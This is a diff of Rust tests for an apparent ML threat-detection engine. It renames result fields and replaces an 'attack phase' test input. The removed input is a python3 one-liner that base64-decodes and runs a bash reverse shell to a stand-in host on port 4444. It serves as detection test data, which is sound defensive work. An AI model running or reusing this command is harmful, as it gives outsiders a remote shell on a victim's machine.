@@ -399,7 +399,7 @@ mod tests {
             let features =
                 MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());
             let result = engine.score(&features);
-            if result.positive {
+            if result.raw_positive {
                 ml_benign_fp += 1;
             }
         }
@@ -430,7 +430,7 @@ mod tests {
             let features =
                 MlFeatures::extract(&event, &signals, 0, 0, 0, sig_count, 0, &Default::default());
             let result = engine.score(&features);
-            if result.positive {
+            if result.raw_positive {
                 ml_malicious_tp += 1;
             }
         }
@@ -725,7 +725,7 @@ mod tests {
 
         // Attack phase: high-entropy obfuscated commands
         let mut attack_alarms = 0;
-        let obfuscated = "python3 -c 'import base64,subprocess;subprocess.call(base64.b64decode(\"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5OC41MS4xMDAuNzcvNDQ0NCAwPiYx\"))'";
+        let obfuscated = format!("powershell -enc {}", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".repeat(3));
         for i in 50..100 {
             let event = TelemetryEvent {
                 ts_unix: i,
